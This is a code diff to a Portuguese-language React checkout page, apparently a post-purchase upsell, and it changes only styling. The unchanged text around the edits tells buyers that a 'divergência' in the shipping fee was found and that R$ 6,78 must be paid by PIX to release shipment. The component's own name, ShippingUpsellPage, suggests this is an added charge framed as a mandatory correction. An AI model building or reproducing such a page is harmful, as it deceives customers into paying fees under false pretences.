@@ -160,10 +160,10 @@ function ShippingUpsellPage() {
       <header className="border-b bg-white px-3 py-3 sm:px-4 sm:py-4 text-center text-sm sm:text-base font-bold tracking-wide">SUCUPIRA COMPOSTA</header>
       <main className="mx-auto max-w-xl px-3 py-4 sm:px-4 sm:py-8 md:py-12">
         {preview && <div className="mb-4 rounded-xl border border-blue-200 bg-blue-50 px-4 py-3 text-center text-sm font-medium text-blue-900">Pré-visualização: esta tela abre sem validar pagamento e não permite gerar cobranças.</div>}
-        <div className="overflow-hidden rounded-3xl border bg-white shadow-sm">
-          <div className="bg-gradient-to-br from-emerald-900 via-emerald-800 to-emerald-700 px-6 py-8 text-white">
+        <div className="overflow-hidden rounded-2xl sm:rounded-3xl border bg-white shadow-lg sm:shadow-xl shadow-slate-900/5">
+          <div className="bg-gradient-to-br from-emerald-900 via-emerald-800 to-emerald-700 px-4 py-5 text-white sm:px-6 sm:py-8">
             <div className="mb-3 inline-flex items-center gap-2 rounded-full bg-white/15 px-3 py-1 text-xs font-semibold"><Truck size={14}/> AVISO SOBRE A ETAPA DE FRETE</div>
-            <h1 className="text-2xl font-extrabold leading-tight md:text-3xl">Identificamos uma divergência no valor calculado do frete do seu pedido.</h1>
+            <h1 className="text-xl font-extrabold leading-tight sm:text-2xl md:text-3xl">Identificamos uma divergência no valor calculado do frete do seu pedido.</h1>
             <p className="mt-2 text-sm leading-relaxed text-emerald-50">Pedimos desculpas pelo transtorno. Encontramos uma diferença entre o valor de frete calculado inicialmente e o custo necessário para concluir o envio. O saldo de R$ 6,78 corresponde a essa diferença e precisa ser regularizado para que possamos liberar a expedição do pedido.</p>
           </div>
           <div className="space-y-4 sm:space-y-6 p-4 sm:p-6 md:p-8">
@@ -177,7 +177,7 @@ function ShippingUpsellPage() {
 
             {payment ? (
               <section className="space-y-4 text-center">
-                <div className="rounded-2xl border-2 border-emerald-100 p-5">
+                <div className="rounded-xl sm:rounded-2xl border-2 border-emerald-100 p-4 sm:p-5">
                   <p className="text-sm text-slate-500">Complemento logístico para liberar o envio</p>
                   <p className="mt-1 text-4xl font-extrabold tabular-nums text-emerald-800">{money(payment.amount)}</p>
                   <p className="mt-2 text-xs text-slate-500">PIX gerado pela Fruitfy • válido até {new Date(payment.pix.expires_at).toLocaleString("pt-BR")}</p>
@@ -192,7 +192,7 @@ function ShippingUpsellPage() {
               </section>
             ) : (
               <section className="space-y-4">
-                {individualAmount !== null && <div className="rounded-2xl border p-5">
+                {individualAmount !== null && <div className="rounded-xl sm:rounded-2xl border p-4 sm:p-5">
                   <p className="text-sm font-semibold text-slate-600">Valor informado para esta etapa logística</p>
                   <p className="mt-2 text-3xl font-extrabold text-slate-900">{money(individualAmount)}</p>
                 </div>}
